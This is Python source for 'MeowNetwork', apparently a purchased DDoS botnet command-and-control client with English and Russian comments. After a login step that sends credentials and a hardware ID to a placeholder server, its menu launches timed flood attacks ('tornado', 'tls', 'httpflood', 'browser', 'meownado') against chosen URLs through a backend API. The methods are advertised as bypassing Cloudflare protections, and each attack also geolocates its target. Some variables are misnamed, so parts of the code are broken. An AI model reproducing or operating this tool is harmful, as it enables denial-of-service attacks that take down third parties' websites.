import asyncio
import aioconsole
import requests
from rgbprint import gradient_print, Color
import os
import platform
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import ctypes
import socket
import uuid
from urllib.parse import urlparse

"""Thank you for purchasing this resource, when exploiting this botnet, please indicate the coder. @tcpallow , @meowreset , @analmeowbotnet .
    Спасибо за покупку этого ресурса, при эксплуатации этого ботнета, пожалуйста, указывайте кодера. @tcpallow , @meowreset , @analmeowbotnet .
"""


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

version = "1.0"

async def clear_console():
    if platform.system().lower() == "windows":
        os.system('cls')
    else:
        os.system('clear')

async def send_auth_request(username, password, hwid):
    url = f'https://yourlink.com/index.php?username={username}&password={password}&hwid={hwid}'
    try:
        response = requests.post(url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        return str(e)

def get_hwid():
    system = platform.system().lower()
    if system == "windows":
        try:
            import wmi
            c = wmi.WMI()
            hard_drives = c.Win32_DiskDrive()
            hwid = ""
            for drive in hard_drives:
                hwid += drive.SerialNumber.strip()
            return hwid if hwid else socket.gethostname()
        except ImportError:
            return str(uuid.uuid1())
    elif system == "linux" or system == "darwin":
        try:
            with open('/sys/class/dmi/id/product_uuid', 'r') as f:
                return f.read().strip()
        except FileNotFoundError:
            pass

        try:
            with open('/sys/class/dmi/id/board_serial', 'r') as f:
                return f.read().strip()
        except FileNotFoundError:
            pass

        return str(uuid.uuid1())
    else:
        return socket.gethostname()

async def authmain():
    await clear_console()
    gradient_print(f"          .Auth\n          .Exit", start_color=0x2c1fe0, end_color=0xad1fe0)
    print('')
    gradient_print("""         meow@network# >>> """, start_color=0x2c1fe0, end_color=0xad1fe0)
    select = await aioconsole.ainput(f'          ')
    if select.lower() == '.auth':
        await clear_console()
        gradient_print("""         Username write >>> """, start_color=0x2c1fe0, end_color=0xad1fe0)
        global username
        username = await aioconsole.ainput(f'          ')
        gradient_print("""         Password write >>> """, start_color=0x2c1fe0, end_color=0xad1fe0)
        password = await aioconsole.ainput(f'          ')
        hwid = get_hwid()
        await authenticate_user(username, password, hwid)
    elif select.lower() == '.exit':
        os._exit(0)
    else:
        gradient_print("""         Failed...""", start_color=0x2c1fe0, end_color=0xad1fe0)
        await asyncio.sleep(2)    
        await clear_console()
        await authmain()

async def authenticate_user(username, password, hwid):
    await clear_console()
    auth_response = await send_auth_request(username, password, hwid)
    if auth_response == "Authorized":
        gradient_print("""         Successful authorization.""", start_color=0x2c1fe0, end_color=0xad1fe0)
        await asyncio.sleep(4)
        if platform.system().lower() == "windows":
            SetConsoleTitle = ctypes.windll.kernel32.SetConsoleTitleW
            SetConsoleTitle.argtypes = [ctypes.c_wchar_p]
            SetConsoleTitle.restype = ctypes.c_bool
            title = f"MeowNetwork - User: {username}"
            if not SetConsoleTitle(title):
                raise ctypes.WinError()
        
        await main()
    else:
        gradient_print("""         Authorization failed.""", start_color=0x2c1fe0, end_color=0xad1fe0)
        await asyncio.sleep(4)
        await clear_console()
        await authmain()
        
async def main():
    await clear_console()
    """In line coded: @ insert your username telegram or discord.
        В строке coded: @ вставьте свое имя пользователя Telegram или Discord.
        In line website: insert your link on website, or delete from code line website
        В строку website: вставьте ссылку на веб-сайт или удалите ее из кода.
        Also change the name from MeowNetwork to your name.
        Также измените название с MeowNetwork на свое название.
    """
    text = f'''
    
                                       MeowNetwork {version} >< CNC     
                           coded: @your_username    website: https://youlink.com/          
                                                                                                         
        
                             .tornado - bypass cloudflare UAM
                             .tls - bypass non protected ssl
                             .httpflood - bypass no ssl
                             .browser - bypass cloudflare captcha
                             .meownado - selfwritten method, bypass cloudflare UAM
                             .exit - exit meownetwork
'''
    gradient_print(text, start_color=0x2c1fe0, end_color=0xad1fe0)
    """Also write your methods l4-l7 in the list
        Так же напишите свои методы l4-l7 в список
    """
    while True:
        print('')
        print('')
        gradient_print("""         meow@network# >>> """, start_color=0x2c1fe0, end_color=0xad1fe0)
        command = await aioconsole.ainput(f'          ')
        if command.lower().startswith('.tornado'):
            parts = command.split()
            if len(parts) < 3:
                gradient_print("""         Invalid command format. Use: .tornado <target> <time>""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            target = parts[1]
            time = parts[2]
            if not time.isdigit():
                gradient_print("""         Time must be a number.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            if not target.startswith(('http://', 'https://')):
                gradient_print("""         Target must start with 'http://' or 'https://'.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            url = f'https://yourlink.com/api?target={target}&time={time}&methods=tornado&password=your_password'
            await handle_request(url, target, time)
        elif command.lower().startswith('.tls'):
            parts = command.split()
            if len(parts) < 3:
                gradient_print("""         Invalid command format. Use: .tls <target> <time>""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            target = parts[1]
            time = parts[2]
            if not time.isdigit():
                gradient_print("""         Time must be a number.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            if not target.startswith(('http://', 'https://')):
                gradient_print("""         Target must start with 'http://' or 'https://'.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            url = f'https://yourlink.com/api?target={target}&time={time}&methods=tls&password=your_password'
            await handle_request(url, target, time)
        
        elif command.lower().startswith('.httpflood'):
            parts = command.split()
            if len(parts) < 3:
                gradient_print("""         Invalid command format. Use: .httpflood <target> <time>""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            target = parts[1]
            time = parts[2]
            if not time.isdigit():
                gradient_print("""         Time must be a number.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            if not target.startswith(('http://', 'https://')):
                gradient_print("""         Target must start with 'http://' or 'https://'.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            url = f'https://yourlink.com/api?target={target}&time={time}&methods=httpflood&password=your_passwors'
            await handle_request(url, target, time)
        
        elif command.lower().startswith('.meownado'):
            parts = command.split()
            if len(parts) < 3:
                gradient_print("""         Invalid command format. Use: .meownado <target> <time>""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            target = parts[1]
            time = parts[2]
            if not time.isdigit():
                gradient_print("""         Time must be a number.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            if not target.startswith(('http://', 'https://')):
                gradient_print("""         Target must start with 'http://' or 'https://'.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            url = f'https://yourlink.com/api?target={target}&time={time}&methods=meownado1.0&password=your_password'
            await handle_request(url, target, time)
        
        elif command.lower().startswith('.stop'):
            parts = command.split()
            if len(parts) < 2:
                gradient_print("""         Invalid command format. Use: .stop <target>""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue            
            target = parts[1]
            
            if not target.startswith(('http://', 'https://')):
                gradient_print("""         Target must start with 'http://' or 'https://'.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            url = f'https://yourlink.com/api/stop?target={target}&password=your_password'
            response = requests.get(url)
            gradient_print(f"""         Stop attack on {target}""", start_color=0x2c1fe0, end_color=0xad1fe0)
        
        elif command.lower().startswith('.browser'):
            parts = command.split()
            if len(parts) < 3:
                gradient_print("""         Invalid command format. Use: .browser <target> <time>""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            target = parts[1]
            time = parts[2]
            if not time.isdigit():
                gradient_print("""         Time must be a number.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            if not target.startswith(('http://', 'https://')):
                gradient_print("""         Target must start with 'http://' or 'https://'.""", start_color=0x2c1fe0, end_color=0xad1fe0)
                await asyncio.sleep(2)
                continue
            
            url = f'https://yourlink.com/api?target={target}&time={time}&methods=browser&password=your_password'
            await handle_request(url, target, time)
            
        elif command.lower() == '.exit':
            gradient_print("""         Exiting meownetwork...""", start_color=0x2c1fe0, end_color=0xad1fe0)
            await clear_console()
            break
        
        else:
            gradient_print("""         Unknown command.""", start_color=0x2c1fe0, end_color=0xad1fe0)
            await asyncio.sleep(4)

async def handle_request(url, target, time):
    try:
        """To get an API key you need to register on the site which is below in the variable ipinfo_url
            Для получения API ключа вам необходимо зарегистрироваться на сайте который находится ниже в переменной ipinfo_url
        """
        api_key = "your_api_key"
        ipinfo_url = f"https://ipinfo.io/{url}?token={api_key}"
        
        ipinfo_response = requests.get(ipinfo_url)
        ipinfo_response.raise_for_status()
        ipinfo_data = ipinfo_response.json()
        response = requests.get(url)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('error') == 'No available slots or failed to connect to any server':
            gradient_print("""         No available slots or failed to connect to any server""", start_color=0x2c1fe0, end_color=0xad1fe0)
        else:
            gradient_print(f"""         Executing attack on {target} for {time} seconds.""", start_color=0x2c1fe0, end_color=0xad1fe0)
            command = command.lstrip('.').capitalize()
            textdetalic = (
                f'\n'
                f'       [Attack Detalis]\n'
                f'\n'
                f'         Target: {target}\n'
                f'         City: {ipinfo_data["city"]}\n'
                f'         Region: {ipinfo_data["region"]}\n'
                f'         Country: {ipinfo_data["country"]}\n'
                f'         Organization: {ipinfo_data["org"]}\n'
                f'         Method: {comand}'
                f'\n'
                f'       [Attack Detalis]'
                f'\n'
            )
            gradient_print(textdetalic, start_color=0x2c1fe0, end_color=0xad1fe0)
            
    except requests.exceptions.RequestException as e:
        gradient_print(f"""         No available slots or failed to connect to any server""", start_color=0x2c1fe0, end_color=0xad1fe0)
                

if __name__ == "__main__":
    asyncio.run(authmain())